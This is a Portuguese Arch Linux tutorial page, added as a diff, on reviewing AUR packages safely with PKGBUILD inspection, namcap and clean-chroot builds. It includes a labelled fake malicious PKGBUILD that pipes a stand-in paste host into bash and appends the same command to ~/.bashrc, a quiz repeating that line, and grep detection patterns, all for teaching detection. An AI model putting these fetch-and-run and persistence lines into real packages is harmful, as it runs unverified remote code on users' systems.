@@ -1,0 +1,415 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Arch AUR com Segurança — revisar PKGBUILD, namcap e chroot limpo | Guia Arch</title>
+<meta name="description" content="Como usar o AUR com segurança: o que olhar na página do pacote, o que procurar no PKGBUILD e no .install (source estranha, curl | sh, sudo), namcap real, compilar num chroot limpo com devtools e o que fazer quando um pacote do AUR quebra ou some.">
+<link rel="stylesheet" href="assets/style.css">
+<script>try{var t=localStorage.getItem("tema");if(t)document.documentElement.setAttribute("data-theme",t)}catch(e){}</script>
+</head>
+<body>
+<div class="layout">
+<nav class="sidebar" id="sidebar" aria-label="Tópicos"></nav>
+<main class="main">
+<div class="content">
+
+<div class="pager"></div>
+
+<h1>AUR com <span class="hl">Segurança</span></h1>
+
+<p class="intro">No <a href="aur.html">AUR</a>, ninguém revisa as receitas antes de você. Isso não quer dizer que o AUR seja perigoso para quem toma cuidado: quer dizer que <strong>você é o revisor</strong>. Esta aula é a lista do que olhar, com que ferramentas, e o que fazer quando um pacote do AUR quebra ou desaparece.</p>
+
+<div class="note">
+<strong>Você vai aprender</strong>
+<ul>
+  <li>O que olhar na página do pacote antes de baixar.</li>
+  <li>O que procurar no <code>PKGBUILD</code> e no script <code>.install</code>, com exemplos reais e um exemplo ruim.</li>
+  <li>Usar o <code>namcap</code> e entender os avisos.</li>
+  <li>O que é compilar num chroot limpo (<code>devtools</code>).</li>
+  <li>O que fazer quando um pacote do AUR quebra, fica abandonado ou some.</li>
+</ul>
+</div>
+
+<hr>
+
+<h2>Onde está o risco</h2>
+
+<p>Um pacote do AUR passa por dois momentos, e os dois executam código de outra pessoa:</p>
+
+<div class="table-wrap">
+<table class="ref">
+<tr><th>Momento</th><th>O que roda</th><th>Com que poder</th></tr>
+<tr><td><code>makepkg</code></td><td>O PKGBUILD inteiro (é Bash): <code>prepare()</code>, <code>build()</code>, <code>check()</code>, <code>package()</code> e qualquer comando solto no arquivo</td><td>O <strong>seu</strong> usuário: pode ler e apagar a sua pasta pessoal, suas chaves SSH, seus documentos</td></tr>
+<tr><td><code>pacman -U</code></td><td>Copia os arquivos do pacote e roda o script <code>.install</code>, se houver</td><td><strong>root</strong>: pode mexer em qualquer coisa do sistema</td></tr>
+</table>
+</div>
+
+<p>Por isso a revisão tem que acontecer <strong>antes</strong> do <code>makepkg</code>. Depois que ele rodou, o código já rodou.</p>
+
+<hr>
+
+<h2>1. Antes de baixar: a página</h2>
+
+<p>Abra <code>https://aur.archlinux.org/packages/NOME</code> (os campos estão explicados em <a href="aur.html">O que é o AUR</a>) e responda:</p>
+
+<ul>
+  <li><strong>O nome é o que você procurava?</strong> Desconfie de nomes que imitam programas conhecidos com um "extra": <code>-fix</code>, <code>-patch</code>, <code>-patched</code>, <code>-free</code>, <code>-premium</code>. Os pacotes maliciosos de 2025 tinham nomes assim (<code>firefox-patch-bin</code>, <code>librewolf-fix-bin</code>).</li>
+  <li><strong>Idade e votos:</strong> "First Submitted" de ontem, 0 votos, e um programa famoso? Procure o pacote "oficial" desse programa no AUR: geralmente é antigo e tem centenas de votos.</li>
+  <li><strong>Upstream URL:</strong> aponta para o site ou o GitHub do projeto de verdade?</li>
+  <li><strong>Mantenedor e "Last Packager":</strong> mudaram há pouco? Pacote órfão adotado por uma conta nova merece leitura cuidadosa da última mudança (o caso do <code>acroread</code> em 2018).</li>
+  <li><strong>Comentários:</strong> alguém reclamou de algo estranho? O pacote está quebrado (como o <code>paru-bin</code>)?</li>
+  <li><strong>"View Changes":</strong> o histórico do git no navegador. Veja o que a última versão mudou.</li>
+</ul>
+
+<hr>
+
+<h2>2. Ler o PKGBUILD</h2>
+
+<p>Você não precisa entender cada linha de um <code>build()</code> complicado. Precisa achar o que <strong>não deveria estar ali</strong>. A tabela:</p>
+
+<div class="table-wrap">
+<table class="ref">
+<tr><th>Onde</th><th>Normal</th><th>Suspeito</th></tr>
+<tr><td><code>source</code></td><td>Site ou GitHub/GitLab oficial do projeto, por <code>https</code>; arquivos pequenos (patches) no próprio repositório da receita</td><td>Domínios que não têm nada a ver com o projeto, endereços IP, encurtadores de link, pastebins, <code>http://</code> sem assinatura</td></tr>
+<tr><td><code>sha256sums</code></td><td>Uma soma para cada arquivo; <code>SKIP</code> só para fontes do git (<code>git+https://…</code>) e para assinaturas <code>.sig</code></td><td><code>SKIP</code> num <code>.tar.gz</code> baixado da internet (o arquivo pode mudar sem ninguém perceber)</td></tr>
+<tr><td>Funções</td><td><code>./configure</code>, <code>make</code>, <code>cargo build</code>, <code>install -Dm…</code> para dentro de <code>"$pkgdir"</code></td><td><code>curl … | sh</code>, <code>wget</code>, <code>git clone</code> <strong>dentro</strong> das funções (baixar coisas que não passaram pela verificação de <code>source</code>)</td></tr>
+<tr><td>Privilégios</td><td>Nenhum: o makepkg roda como você</td><td><code>sudo</code>, <code>su</code>, <code>pkexec</code> dentro do PKGBUILD</td></tr>
+<tr><td>Caminhos</td><td>Tudo em <code>"$srcdir"</code> e <code>"$pkgdir"</code></td><td>Escrever em <code>$HOME</code>, <code>~/.bashrc</code>, <code>/etc</code>, <code>/usr</code> direto (sem <code>$pkgdir</code>)</td></tr>
+<tr><td>Texto</td><td>Código legível</td><td><code>base64 -d</code>, <code>eval</code>, longas sequências de letras sem sentido (código escondido)</td></tr>
+<tr><td><code>install=</code></td><td>Mensagens, atualizar caches</td><td>Baixar coisas, criar serviços do systemd que não têm a ver com o programa (veja abaixo)</td></tr>
+</table>
+</div>
+
+<p>Uma busca rápida com <code>grep</code> nas receitas da ana (as três que ela instalou):</p>
+
+<pre class="term" data-cwd="~/aur">$ grep -n -E "^(source|install)|curl|wget|sudo|eval|base64" */PKGBUILD
+downgrade/PKGBUILD:12:source=("https://github.com/archlinux-downgrade/$pkgname/releases/download/v${pkgver//_/-}/downgrade-${pkgver//_/-}.tar.gz")
+downgrade/PKGBUILD:14:optdepends=('sudo: for installation via sudo')       « só uma dependência opcional
+paru-bin/PKGBUILD:7:source_x86_64=("https://github.com/Morganamilo/paru/releases/download/v$pkgver/paru-v$pkgver-x86_64.tar.zst")
+paru-bin/PKGBUILD:8:source_aarch64=("https://github.com/Morganamilo/paru/releases/download/v$pkgver/paru-v$pkgver-aarch64.tar.zst")
+paru-bin/PKGBUILD:9:source_armv7h=("https://github.com/Morganamilo/paru/releases/download/v$pkgver/paru-v$pkgver-armv7h.tar.zst")
+yay-bin/PKGBUILD:14:  'sudo: privilege elevation'
+yay-bin/PKGBUILD:20:source_x86_64=("https://github.com/Jguer/yay/releases/download/v${pkgver}/${pkgname/-bin/}_${pkgver}_x86_64.tar.gz")
+yay-bin/PKGBUILD:21:source_aarch64=("https://github.com/Jguer/yay/releases/download/v${pkgver}/${pkgname/-bin/}_${pkgver}_aarch64.tar.gz")
+yay-bin/PKGBUILD:22:source_armv7h=("https://github.com/Jguer/yay/releases/download/v${pkgver}/${pkgname/-bin/}_${pkgver}_armv7h.tar.gz")
+$ grep -c SKIP */PKGBUILD
+downgrade/PKGBUILD:0
+paru-bin/PKGBUILD:0
+yay-bin/PKGBUILD:0</pre>
+
+<p>Resultado limpo: todas as fontes vêm do GitHub oficial de cada projeto, por <code>https</code>; os <code>sudo</code> encontrados são só a dependência opcional (texto entre aspas), não comandos; nenhuma soma <code>SKIP</code>; nenhum <code>install=</code>. O <code>grep</code> não substitui a leitura, mas mostra rápido onde olhar.</p>
+
+<div class="try" data-goal="ran:grep.*aur,out:github.com" data-solucao="grep -n source ~/aur/*/PKGBUILD">
+<p class="try-task"><strong>Missão:</strong> sem entrar nas pastas, mostre de uma vez as linhas que contêm <code>source</code> nos três <code>PKGBUILD</code> de <code>~/aur</code> (dica: <code>~/aur/*/PKGBUILD</code>). De qual site vêm os downloads?</p>
+</div>
+
+<h3>Como seria uma receita ruim (ilustrativo)</h3>
+
+<p>O exemplo abaixo foi <strong>inventado para esta aula</strong>; não é um pacote real. Veja quantos sinais ele tem:</p>
+
+<pre class="file" data-file="ilustrativo: PKGBUILD de um pacote malicioso (NÃO é real)">pkgname=firefox-turbo-bin          # nome que imita um programa famoso
+pkgver=150.0
+pkgrel=1
+arch=('x86_64')
+source=("http://203.0.113.7/ff.tar.gz")   # IP, sem https, sem relação com a Mozilla
+sha256sums=('SKIP')                       # "não confira o download"
+install=firefox-turbo.install
+
+package() {
+  install -Dm755 firefox "$pkgdir/usr/bin/firefox"
+  curl -s https://paste.example/x | bash  # baixa e roda outro script, sem verificação
+  echo 'curl -s https://paste.example/y | bash' &gt;&gt; ~/.bashrc   # mexe na sua pasta pessoal
+}</pre>
+
+<p>Cada comentário é um motivo para fechar a página. O <code>curl … | bash</code> é o pior: o script baixado não passa pelas somas, pode ser trocado a qualquer momento no servidor e roda com o seu usuário.</p>
+
+<hr>
+
+<h2>3. O script .install</h2>
+
+<p>Se o PKGBUILD tem uma linha <code>install=algo.install</code>, esse arquivo entra no pacote e o <strong>pacman o executa como root</strong> na instalação, atualização ou remoção. Ele define funções com nomes fixos:</p>
+
+<div class="table-wrap">
+<table class="ref">
+<tr><th>Função</th><th>Quando roda</th></tr>
+<tr><td><code>pre_install</code> / <code>post_install</code></td><td>Antes / depois de instalar pela primeira vez</td></tr>
+<tr><td><code>pre_upgrade</code> / <code>post_upgrade</code></td><td>Antes / depois de atualizar (recebem a versão nova e a antiga)</td></tr>
+<tr><td><code>pre_remove</code> / <code>post_remove</code></td><td>Antes / depois de remover</td></tr>
+</table>
+</div>
+
+<p>Pacotes oficiais também têm <code>.install</code>. O pacman guarda uma cópia de cada um; o do GRUB, na VM, é um bom exemplo do que é <strong>normal</strong>: mensagens e uma pequena correção de arquivo:</p>
+
+<pre class="term">$ pacman -Qi grub | grep -i script
+Script de instalação : Sim
+$ cat /var/lib/pacman/local/grub-2:2.16-1/install
+#!/bin/sh
+
+post_upgrade() {
+  # We used to package /boot/grub/grub.cfg, but there is no reason to.
+  # Remove the file from package, but move real file back in place.
+  if [ ! -f /boot/grub/grub.cfg -a -f /boot/grub/grub.cfg.pacsave ]; then
+    mv /boot/grub/grub.cfg.pacsave /boot/grub/grub.cfg
+  fi
+
+  # Give a hint to update installation and configuration one after another.
+  cat &lt;&lt;EOM
+:: To use the new features provided in this GRUB update, it is recommended
+   to install it to the MBR or UEFI. …
+EOM
+…
+}
+
+post_install() {
+  cat &lt;&lt;EOM
+:: Install your bootloader and generate configuration with:
+     # grub-install ...
+     # grub-mkconfig -o /boot/grub/grub.cfg
+EOM
+}</pre>
+
+<p>Suspeito num <code>.install</code>: download de qualquer coisa, criação de usuários ou serviços que não têm relação com o programa, mudanças em <code>/etc/sudoers</code>, <code>/etc/ssh</code> ou na configuração do pacman. Para tarefas repetitivas (atualizar cache de ícones, recarregar o systemd), o Arch prefere <a href="hooks.html">hooks do pacman</a> ao <code>.install</code>.</p>
+
+<hr>
+
+<h2>4. Ao atualizar: leia as diferenças</h2>
+
+<p>Uma receita boa pode virar ruim numa atualização (é exatamente o que acontece quando alguém adota um pacote órfão com más intenções). Por isso, a cada atualização, leia só o que mudou:</p>
+
+<ul>
+  <li>À mão: <code>git pull</code> e depois <code>git log -p</code> (ou <code>git diff HEAD@{1}</code>), na pasta da receita. Veja <a href="makepkg.html">makepkg</a>.</li>
+  <li>No yay: responda <code>A</code> (todos) em <code>Exibir diffs?</code>, ou configure de vez com <code>yay --save --answerdiff All</code>.</li>
+  <li>No paru: a revisão aparece por padrão. Veja <a href="yay-paru.html">yay e paru</a>.</li>
+</ul>
+
+<p>Numa atualização normal, o diff costuma ser pequeno: <code>pkgver</code> e as somas mudam, às vezes uma dependência. Uma mudança de <code>source</code> para outro domínio, ou uma função nova cheia de comandos de rede, é o sinal para parar.</p>
+
+<hr>
+
+<h2>5. namcap: a revisão automática</h2>
+
+<p>O <strong>namcap</strong> (um anagrama de <em>pacman</em>) procura erros comuns de empacotamento. Ele não procura malware: procura receitas mal feitas (dependências erradas, licença mal escrita, arquivos no lugar errado). Funciona no <code>PKGBUILD</code> e no pacote pronto:</p>
+
+<pre class="term" data-cwd="/tmp/a5/downgrade">$ namcap PKGBUILD
+PKGBUILD (downgrade) W: Missing Maintainer tag
+$ echo $?
+0
+$ namcap downgrade-12.0.4-1-any.pkg.tar.zst
+downgrade E: The SPDX license statement 'GPL' should be formatted as 'GPL-1.0-or-later' instead
+downgrade W: Dependency bash detected and implicitly satisfied (programs ['bash'] needed in scripts ['usr/share/bash-completion/completions/downgrade', 'usr/share/bash-completion/completions/pacignore', 'usr/bin/downgrade', 'usr/bin/pacignore'])
+downgrade W: Dependency included, but may not be needed ('pacman-contrib')
+downgrade W: Dependency included, but may not be needed ('fzf')</pre>
+
+<div class="table-wrap">
+<table class="ref">
+<tr><th>Linha</th><th>O que quer dizer</th></tr>
+<tr><td><code>W: Missing Maintainer tag</code></td><td><code>W</code> = aviso (<em>warning</em>). Falta o comentário <code># Maintainer:</code> no topo.</td></tr>
+<tr><td><code>E: The SPDX license statement 'GPL'…</code></td><td><code>E</code> = erro. A licença deveria usar o nome padrão SPDX (<code>GPL-3.0-or-later</code>…). Erro de forma, não de segurança.</td></tr>
+<tr><td><code>Dependency bash detected and implicitly satisfied</code></td><td>Os scripts usam <code>bash</code>, mas a receita não lista <code>bash</code> em <code>depends</code> (funciona porque todo Arch tem bash).</td></tr>
+<tr><td><code>Dependency included, but may not be needed</code></td><td>O namcap não achou uso dessas dependências. Em scripts ele erra muito: o <code>downgrade</code> chama <code>fzf</code> e <code>pacsort</code> por nome, e o namcap não vê isso.</td></tr>
+</table>
+</div>
+
+<p>Repare: código de saída 0 mesmo com <code>E:</code>. O namcap só informa; quem decide é você. E <strong>nenhuma</strong> mensagem quer dizer "nada a apontar".</p>
+
+<h3>O namcap teria avisado do paru-bin</h3>
+
+<p>Rodando o namcap no pacote do <code>paru-bin</code> que a ana compilou, aparece o problema que quebrou o paru (veja <a href="yay-paru.html">yay e paru</a>):</p>
+
+<pre class="term" data-cwd="~/aur/paru-bin">$ namcap paru-bin-2.1.0-1-x86_64.pkg.tar.zst
+paru-bin E: Soname dependency libalpm.so specified without version number
+paru-bin W: Referenced library 'libalpm.so.15' is an uninstalled dependency (needed in files ['usr/bin/paru'])     « aqui!
+paru-bin W: Soname dependency included, but may not be needed ('libalpm.so')
+…</pre>
+
+<p>A receita dizia <code>libalpm.so&gt;=14</code> (qualquer versão a partir da 14), mas o binário precisa exatamente da <code>libalpm.so.15</code>, e o sistema só tem a <code>.16</code>. Uma dependência declarada de forma "frouxa" deixou o pacman instalar um programa que não abre.</p>
+
+<hr>
+
+<h2>6. Compilar num chroot limpo (devtools)</h2>
+
+<p>Quando você roda <code>makepkg</code>, a compilação acontece no <strong>seu</strong> sistema: com os seus pacotes instalados e com acesso à sua pasta pessoal. Isso tem dois problemas: uma receita que esqueceu uma dependência funciona na sua máquina "por sorte"; e uma receita mal-intencionada pode ler os seus arquivos durante o <code>build()</code>.</p>
+
+<p>O pacote <code>devtools</code> (o mesmo que os empacotadores oficiais do Arch usam) compila dentro de um <strong>chroot limpo</strong>: uma mini instalação do Arch, só com <code>base-devel</code> e as dependências da receita, isolada num contêiner (<code>systemd-nspawn</code>). Na VM ele já está instalado:</p>
+
+<pre class="term">$ pacman -Ql devtools | grep -E "bin/(extra-x86_64-build|makechrootpkg|mkarchroot|arch-nspawn|pkgctl|checkpkg)$"
+devtools /usr/bin/arch-nspawn
+devtools /usr/bin/checkpkg
+devtools /usr/bin/extra-x86_64-build
+devtools /usr/bin/makechrootpkg
+devtools /usr/bin/mkarchroot
+devtools /usr/bin/pkgctl
+$ extra-x86_64-build -h
+Usage: extra-x86_64-build [options] -- [makechrootpkg args]
+    -h         This help
+    -c         Recreate the chroot before building
+    -r &lt;dir&gt;   Create chroots in this directory
+
+Default makechrootpkg args: -c -n -C</pre>
+
+<div class="table-wrap">
+<table class="ref">
+<tr><th>Comando</th><th>O que faz</th></tr>
+<tr><td><code>extra-x86_64-build</code></td><td>O jeito simples: cria (na primeira vez) o chroot em <code>/var/lib/archbuild/extra-x86_64/</code>, atualiza, compila a receita da pasta atual e deixa o pacote nela. Rode na pasta do PKGBUILD.</td></tr>
+<tr><td><code>mkarchroot DIR/root base-devel</code></td><td>O jeito manual: cria o chroot onde você quiser</td></tr>
+<tr><td><code>makechrootpkg -c -r DIR</code></td><td>Compila a receita da pasta atual dentro de <code>DIR</code> (<code>-c</code> = limpa a cópia de trabalho antes)</td></tr>
+<tr><td><code>checkpkg</code></td><td>Compara o pacote novo com a versão anterior (arquivos e bibliotecas que mudaram)</td></tr>
+</table>
+</div>
+
+<p>O fluxo manual, explicado pelo próprio <code>makechrootpkg -h</code>:</p>
+
+<pre class="term">$ makechrootpkg -h | head -14
+Usage: makechrootpkg [options] -r &lt;chrootdir&gt; [--] [makepkg args]
+ Run this script in a PKGBUILD dir to build a package inside a
+ clean chroot. Arguments passed to this script after the
+ end-of-options marker (--) will be passed to makepkg.
+
+ The chroot dir consists of the following directories:
+ &lt;chrootdir&gt;/{root, copy} but only "root" is required
+ by default. The working copy will be created as needed
+
+The chroot "root" directory must be created via the following
+command:
+    mkarchroot &lt;chrootdir&gt;/root base-devel
+
+This script reads {SRC,SRCPKG,PKG,LOG}DEST, NPROC, MAKEFLAGS and</pre>
+
+<p>Na prática (<strong>ilustrativo</strong>: na VM do guia não criamos o chroot, porque ele baixa e instala um Arch mínimo inteiro, centenas de MiB):</p>
+
+<pre class="file" data-file="ilustrativo: compilar o downgrade num chroot limpo">mkdir ~/chroot
+CHROOT=$HOME/chroot
+mkarchroot $CHROOT/root base-devel          # uma vez: instala base-devel no chroot (pede sudo)
+arch-nspawn $CHROOT/root pacman -Syu        # de vez em quando: atualiza o chroot
+cd ~/aur/downgrade
+makechrootpkg -c -r $CHROOT                 # compila isolado; o .pkg.tar.zst sai na pasta atual
+sudo pacman -U downgrade-*.pkg.tar.zst</pre>
+
+<div class="note">
+<strong>O que o chroot protege, e o que não</strong>
+<p>Ele isola a <strong>compilação</strong>: o <code>build()</code> não enxerga a sua pasta pessoal e não depende do que você tem instalado. Ele <strong>não</strong> protege a <strong>instalação</strong>: o pacote gerado e o <code>.install</code> ainda rodam como root quando você der <code>pacman -U</code>. Ler a receita continua necessário. O paru tem uma opção para usar o chroot sempre (<code>--chroot</code>).</p>
+</div>
+
+<hr>
+
+<h2>Quando um pacote do AUR quebra ou some</h2>
+
+<div class="cenario">
+<strong>O programa não abre: "error while loading shared libraries"</strong>
+<pre class="term">$ paru --version
+paru: error while loading shared libraries: libalpm.so.15: cannot open shared object file: No such file or directory
+$ ldd /usr/bin/paru | grep "not found"
+	libalpm.so.15 =&gt; not found</pre>
+<p><strong>O que aconteceu:</strong> uma biblioteca do sistema foi atualizada (aqui, a do pacman) e o programa do AUR ainda pede a versão antiga. O <code>pacman -Syu</code> não recompila nada do AUR.</p>
+<p><strong>Como resolver:</strong></p>
+<ul>
+  <li>Receita <strong>de fonte</strong>: recompile a mesma versão contra as bibliotecas novas, na pasta da receita: <code>makepkg -Cfsi</code> (no yay: <code>yay -S --rebuild nome</code>).</li>
+  <li>Receita <strong>-bin</strong>: recompilar não adianta (o binário é sempre o mesmo). Troque pela versão de fonte (aqui, <code>paru</code> no lugar de <code>paru-bin</code>) ou espere o mantenedor; marque o pacote como desatualizado e comente na página.</li>
+</ul>
+</div>
+
+<div class="cenario">
+<strong>O pacote está marcado como desatualizado há meses</strong>
+<p><strong>O que aconteceu:</strong> o mantenedor sumiu. O pacote continua funcionando enquanto nada no sistema mudar.</p>
+<p><strong>Como resolver:</strong> você pode atualizar a receita só para você: mude <code>pkgver</code>, rode <code>updpkgsums</code> e <code>makepkg -si</code> (veja <a href="pkgbuild.html">Escrever um PKGBUILD</a>). Se ficar órfão, você mesmo pode adotá-lo.</p>
+</div>
+
+<div class="cenario">
+<strong>O pacote sumiu do AUR</strong>
+<p><strong>Como confirmar:</strong> <code>pacman -Qm</code> ainda mostra o pacote instalado, mas <code>yay -Si nome</code> não acha. Depois procure nos oficiais: <code>pacman -Ss nome</code>.</p>
+<p><strong>Como resolver:</strong> se foi para o <code>extra</code>, instale de lá (<code>sudo pacman -S nome</code>): ele substitui o do AUR. Se foi apagado, o programa instalado continua funcionando, mas sem atualizações: procure o motivo na lista <code>aur-requests</code> e uma alternativa. A sua cópia da receita (em <code>~/aur</code> ou <code>~/.cache/yay</code>) continua com você.</p>
+</div>
+
+<div class="cenario">
+<strong>O site do AUR está fora do ar</strong>
+<p><strong>O que aconteceu:</strong> em 2025 o AUR passou semanas sofrendo ataques de negação de serviço (DDoS), e os ajudantes não conseguiam consultar nada.</p>
+<p><strong>Como resolver:</strong> o Arch mantém uma cópia somente-leitura das receitas no GitHub, com um <em>branch</em> por pacote (<strong>ilustrativo</strong>): <code>git clone --branch NOME --single-branch https://github.com/archlinux/aur.git NOME</code>, e daí <code>makepkg</code> normal. Leia a receita com o mesmo cuidado.</p>
+</div>
+
+<div class="cenario">
+<strong>Atualizar o pacote quebrou o programa</strong>
+<p><strong>Como resolver:</strong> o pacote antigo pode estar na pasta da receita (os <code>.pkg.tar.zst</code> de versões anteriores, se você não apagou) ou em <code>~/.cache/yay/nome/</code>: <code>sudo pacman -U nome-versão-antiga.pkg.tar.zst</code>. Os pacotes do AUR <strong>não</strong> ficam em <code>/var/cache/pacman/pkg</code> nem no Arquivo do Arch. Veja <a href="downgrade.html">Voltar um Pacote</a>.</p>
+</div>
+
+<hr>
+
+<h2>Referência: a lista de conferência</h2>
+<div class="table-wrap">
+<table class="ref">
+<tr><th>Passo</th><th>Como</th></tr>
+<tr><td>Existe nos repositórios oficiais?</td><td><code>pacman -Ss nome</code></td></tr>
+<tr><td>Página: nome, idade, votos, mantenedor, comentários</td><td><code>aur.archlinux.org/packages/nome</code> ou <code>yay -Si nome</code></td></tr>
+<tr><td>Fontes e somas</td><td><code>grep -n -E "^source|sums" PKGBUILD</code></td></tr>
+<tr><td>Comandos estranhos</td><td><code>grep -n -E "curl|wget|sudo|eval|base64" PKGBUILD</code></td></tr>
+<tr><td>Script de instalação</td><td><code>grep install= PKGBUILD</code> e leia o <code>.install</code></td></tr>
+<tr><td>Atualizações</td><td><code>git log -p</code> / "Exibir diffs?" = <code>A</code></td></tr>
+<tr><td>Qualidade da receita e do pacote</td><td><code>namcap PKGBUILD</code>, <code>namcap *.pkg.tar.zst</code></td></tr>
+<tr><td>Compilação isolada</td><td><code>extra-x86_64-build</code> ou <code>makechrootpkg</code> (devtools)</td></tr>
+<tr><td>Programa quebrado por biblioteca</td><td><code>ldd /usr/bin/prog | grep "not found"</code>, recompilar</td></tr>
+</table>
+</div>
+
+<hr>
+
+<h2>Exercícios</h2>
+
+<div class="exercise">
+<h3>1. A ferramenta</h3>
+<p>Qual programa verifica erros comuns em um PKGBUILD ou pacote?</p>
+<div class="ex-code"><input data-answer="namcap" aria-label="programa"></div>
+</div>
+
+<div class="exercise">
+<h3>2. Bibliotecas faltando</h3>
+<p>Complete para ver quais bibliotecas um programa não encontra:</p>
+<div class="ex-code"><input data-answer="ldd" aria-label="comando"> /usr/bin/paru | grep "not found"</div>
+</div>
+
+<div class="mc" data-answer="3">
+<p class="mc-q">3. Qual destas linhas num <code>package()</code> é o maior sinal de alerta?</p>
+<label><input type="radio" name="q3"> <code>install -Dm755 prog "$pkgdir/usr/bin/prog"</code></label>
+<label><input type="radio" name="q3"> <code>make DESTDIR="$pkgdir" install</code></label>
+<label><input type="radio" name="q3"> <code>curl -s https://paste.example/x | bash</code></label>
+<label><input type="radio" name="q3"> <code>install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"</code></label>
+</div>
+
+<div class="mc" data-answer="2">
+<p class="mc-q">4. Com que poder roda o script <code>.install</code> de um pacote?</p>
+<label><input type="radio" name="q4"> Com o seu usuário, durante o makepkg.</label>
+<label><input type="radio" name="q4"> Como root, durante o <code>pacman -U</code>.</label>
+<label><input type="radio" name="q4"> Dentro do chroot limpo.</label>
+<label><input type="radio" name="q4"> Ele nunca é executado.</label>
+</div>
+
+<div class="mc" data-answer="1">
+<p class="mc-q">5. Um <code>-bin</code> quebrou depois de uma atualização do sistema. Recompilar com <code>makepkg -Cfsi</code> resolve?</p>
+<label><input type="radio" name="q5"> Não: o <code>-bin</code> só reempacota o mesmo binário pronto; use a versão de fonte ou espere o mantenedor.</label>
+<label><input type="radio" name="q5"> Sim, sempre.</label>
+<label><input type="radio" name="q5"> Só se rodar como root.</label>
+<label><input type="radio" name="q5"> Só dentro de um chroot.</label>
+</div>
+
+<hr>
+
+<h2>Resumo</h2>
+<ul>
+  <li>O PKGBUILD roda com o seu usuário; o <code>.install</code> roda como root. Revise <strong>antes</strong> do makepkg.</li>
+  <li>Página: nome que imita, idade, votos, mantenedor novo, comentários.</li>
+  <li>Receita: <code>source</code> oficial e <code>https</code>, somas sem <code>SKIP</code>, nada de <code>curl | sh</code>, <code>sudo</code> ou escrita fora de <code>$pkgdir</code>.</li>
+  <li>Em cada atualização, leia o diff.</li>
+  <li><code>namcap</code> aponta receitas mal feitas (e teria apontado o <code>libalpm.so.15</code> do paru-bin).</li>
+  <li>Chroot limpo (devtools) isola a compilação, não a instalação.</li>
+  <li>Quebrou por biblioteca: recompile a receita de fonte; <code>-bin</code> depende do mantenedor.</li>
+</ul>
+
+<p><strong>Na Arch Wiki:</strong> os avisos de segurança e o que fazer com pacotes problemáticos estão em <a href="https://wiki.archlinux.org/title/Arch_User_Repository">Arch User Repository</a> (em português: <a href="https://wiki.archlinux.org/title/Arch_User_Repository_(Portugu%C3%AAs)">Arch User Repository (Português)</a>). O namcap tem a página <a href="https://wiki.archlinux.org/title/Namcap">namcap</a>; a compilação isolada é explicada em <a href="https://wiki.archlinux.org/title/DeveloperWiki:Building_in_a_clean_chroot">DeveloperWiki:Building in a clean chroot</a>; e o que é permitido num <code>.install</code> está em <a href="https://wiki.archlinux.org/title/PKGBUILD#install">PKGBUILD § install</a>. As listas de e-mail <code>aur-general</code> e <code>aur-requests</code> (em <a href="https://lists.archlinux.org/">lists.archlinux.org</a>) registram os avisos de pacotes maliciosos e os pedidos de remoção.</p>
+
+<div class="pager"></div>
+
+</div>
+</main>
+</div>
+<script src="assets/site.js"></script>
+</body>
+</html>
